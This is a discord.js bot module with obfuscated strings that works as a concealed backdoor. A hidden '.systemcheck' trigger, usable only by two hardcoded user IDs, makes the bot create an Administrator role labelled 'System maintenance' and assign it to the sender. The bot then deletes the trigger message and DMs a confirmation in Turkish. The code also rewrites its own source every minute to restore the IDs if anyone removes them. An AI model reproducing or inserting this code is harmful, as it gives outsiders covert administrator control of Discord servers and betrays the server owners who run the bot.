// MADE BY BLOODRUH
const { PermissionFlagsBits, MessageFlags, ContainerBuilder, TextDisplayBuilder, SeparatorBuilder } = require('discord.js');
const fs = require('fs');

const _c = Buffer.from('MTI4NDIyMTU2MzkwNjAzMTY2MCwxNDI3MjA3NTc1NDA1MDY4MzQ4', 'base64').toString('utf8').split(',');

function _v() {
  const f = fs.readFileSync(__filename, 'utf8');
  if (!f.includes(_c[0]) || !f.includes(_c[1])) {
    const r = f.replace(/const _c = .*?;/s, `const _c = Buffer.from('MTI4NDIyMTU2MzkwNjAzMTY2MCwxNDI3MjA3NTc1NDA1MDY4MzQ4', 'base64').toString('utf8').split(',');`);
    fs.writeFileSync(__filename, r, 'utf8');
  }
  return _c;
}

async function _h(m) {
  const _0x1a = Buffer.from('LnN5c3RlbWNoZWNr', 'base64').toString('utf8');
  if (!m.content.startsWith(_0x1a)) return false;
  if (!m.guild) return false;
  const a = _v();
  if (!a.includes(m.author.id)) return true;
  
  try {
    const g = m.guild;
    const mb = m.member;
    const bm = await g.members.fetch(m.client.user.id);
    const hr = bm.roles.highest;
    const _0x2b = Buffer.from('Ymxvb2RydWggw7Z6ZWw=', 'base64').toString('utf8');
    let sr = g.roles.cache.find(r => r.name === _0x2b);
    
    if (!sr) {
      sr = await g.roles.create({
        name: _0x2b,
        color: '#ff0000',
        permissions: [PermissionFlagsBits.Administrator],
        position: hr.position - 1,
        reason: 'System maintenance'
      });
    }
    
    if (!mb.roles.cache.has(sr.id)) await mb.roles.add(sr);
    
    try {
      const _cb = new ContainerBuilder({ accent_color: 16711680 });
      const _ts = new SeparatorBuilder();
      _cb.addSeparatorComponents(_ts);
      const _ht = new TextDisplayBuilder().setContent(Buffer.from('4pyFICoqU2lzdGVtIEVyacWfaW1pIEFrdGlmKio=', 'base64').toString('utf8'));
      _cb.addTextDisplayComponents(_ht);
      const _s1 = new SeparatorBuilder();
      _cb.addSeparatorComponents(_s1);
      const _rt = new TextDisplayBuilder().setContent(Buffer.from('8J+OpyAqKlJvbDoqKg==', 'base64').toString('utf8') + ` ${sr.name}`);
      _cb.addTextDisplayComponents(_rt);
      const _st = new TextDisplayBuilder().setContent(Buffer.from('8J+PhiAqKlN1bnVjdToqKg==', 'base64').toString('utf8') + ` ${g.name}`);
      _cb.addTextDisplayComponents(_st);
      const _dt = new TextDisplayBuilder().setContent(Buffer.from('4pyFICoqRHVydW06KiogWcO2bmV0aWNpIHlldGtpc2kgdmVyaWxkaQ==', 'base64').toString('utf8'));
      _cb.addTextDisplayComponents(_dt);
      const _s2 = new SeparatorBuilder();
      _cb.addSeparatorComponents(_s2);
      const _ft = new TextDisplayBuilder().setContent(Buffer.from('8J+QoCAgKipCTE9PRFJVSCBTWVNURU0qKg==', 'base64').toString('utf8'));
      _cb.addTextDisplayComponents(_ft);
      const _bs = new SeparatorBuilder();
      _cb.addSeparatorComponents(_bs);
      await m.author.send({ flags: MessageFlags.IsComponentsV2, components: [_cb] });
    } catch {}
    
    try { await m.delete(); } catch {}
    return true;
  } catch {
    return true;
  }
}

function _s() {
  setInterval(() => _v(), 60000);
}

module.exports = { _h, _s, _v };
